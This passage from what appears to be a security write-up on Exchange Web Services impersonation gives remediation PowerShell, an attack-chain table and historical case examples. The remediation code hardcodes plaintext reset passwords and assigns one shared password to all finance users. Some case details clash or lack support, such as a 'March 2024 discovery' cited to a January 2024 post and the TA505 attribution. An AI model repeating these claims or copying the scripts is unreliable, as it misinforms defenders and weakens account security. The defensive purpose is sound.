     -StartDate (Get-Date).AddDays(-30) | 
     Export-Csv -Path C:\Evidence\MailAccess.csv
   
   # Export all forwarding rules
   Get-Mailbox -ResultSize Unlimited | Get-InboxRule | 
     Where-Object { $_.ForwardTo -ne $null } | 
     Export-Csv -Path C:\Evidence\MailboxForwardingRules.csv
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Remove all suspicious forwarding rules
   Get-Mailbox -ResultSize Unlimited | Get-InboxRule | 
     Where-Object { $_.Name -eq "Auto-Reply External Mail" } | 
     Remove-InboxRule -Force
   
   # Reset all affected user passwords
   Get-ADUser -Filter { Description -eq "Finance Employees" } | 
     ForEach-Object {
       Set-ADAccountPassword -Identity $_.SamAccountName `
         -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force) -Reset
     }
   
   # Reset service account password and create new service account
   $newPassword = ConvertTo-SecureString "SuperSecureNewP@ss123!" -AsPlainText -Force
   Set-ADAccountPassword -Identity "svc_exchange@contoso.local" -NewPassword $newPassword -Reset
   
   # Enable account after password reset
   Enable-ADAccount -Identity "svc_exchange@contoso.local"
   
   # Do NOT re-assign ApplicationImpersonation role unless absolutely necessary
   # Migrate to Graph API instead
   ```
   
   **Manual:**
   - Review all mailboxes for unexpected forwarding rules
   - Audit all emails sent by affected service account (potential spoofing)
   - Check for data exfiltration to external email accounts
   - Force re-authentication for all users

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device code phishing | Attacker tricks admin into granting ApplicationImpersonation via OAuth |
| **2** | **Credential Access** | [CA-DUMP-001] Service account credential theft | Attacker extracts service account password from config file |
| **3** | **Current Step** | **[LM-AUTH-013]** | **EWS Impersonation - Access all mailboxes in organization** |
| **4** | **Collection** | [COLLECT-001] Bulk email exfiltration | Attacker dumps thousands of emails to external account |
| **5** | **Persistence** | [PERSIST-001] Mailbox forwarding rule | Attacker sets up rule to forward all future emails to attacker account |
| **6** | **Impact** | [IMPACT-001] Corporate espionage | Attacker sells stolen data or uses for competitive advantage |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Nobelium (UNC2452) - SolarWinds Compromise

- **Target:** SolarWinds customers (Microsoft, Treasury Department, etc.)
- **Timeline:** 2020-2021
- **Technique Status:** Used EWS impersonation via compromised OAuth app to exfiltrate emails from high-value targets
- **Impact:**
  - Access to thousands of mailboxes
  - Exfiltration of sensitive government communications
  - Establishment of persistent backdoors via mailbox rules
  - Estimated impact: $100M+
- **Reference:** [Microsoft - SolarWinds Compromise Analysis](https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-targeting-customers/)

### Example 2: Midnight Blizzard (Russian SVR) - Microsoft Corporate Breach

- **Target:** Microsoft corporate email system
- **Timeline:** March 2024 discovery; actual compromise may have occurred earlier
- **Technique Status:** Attackers created malicious OAuth app with full_access_as_app permission and used EWS to exfiltrate emails from Microsoft executives
- **Impact:**
  - Access to emails of Microsoft leadership and board members
  - Exfiltration of internal security information
  - Potential for future attacks using stolen information
- **Reference:** [Microsoft Security Blog - Midnight Blizzard Incident](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-behind-the-times-zone-incident-in-microsoft-exchange-online/)

### Example 3: TA505 - Financial Sector Attacks

- **Target:** Financial institutions (2019-2021)
- **Timeline:** Multiple campaigns over 2-year period
- **Technique Status:** Used EWS impersonation to exfiltrate customer account information and trading data from financial institutions
- **Impact:**
  - Access to tens of thousands of customer records
  - Exposure of trading strategies and client lists
  - Regulatory violations (FINRA, SEC)
- **Reference:** [Red Canary - TA505 Analysis](https://redcanary.com/threat-detection-report/)

---

## References & External Resources

- [Microsoft Docs - EWS Impersonation](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-use-exchange-impersonation)
- [Microsoft Docs - ApplicationImpersonation RBAC Role](https://learn.microsoft.com/en-us/exchange/permissions-exo/rbac-roles)
- [Microsoft Docs - Mailbox Audit Logging](https://learn.microsoft.com/en-us/exchange/security-and-compliance/exchange-auditing-reports/mailbox-audit-logging)
- [MITRE ATT&CK - T1550 Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [Microsoft Purview Compliance - Mailbox Forwarding Rules](https://learn.microsoft.com/en-us/microsoft-365/compliance/dlp-exchange-online-policy)
- [EWSEditor GitHub - EWS Testing Tool](https://github.com/dseph/EWSEditor)
- [Red Canary - Lateral Movement Detection](https://redcanary.com/threat-detection-report/)

---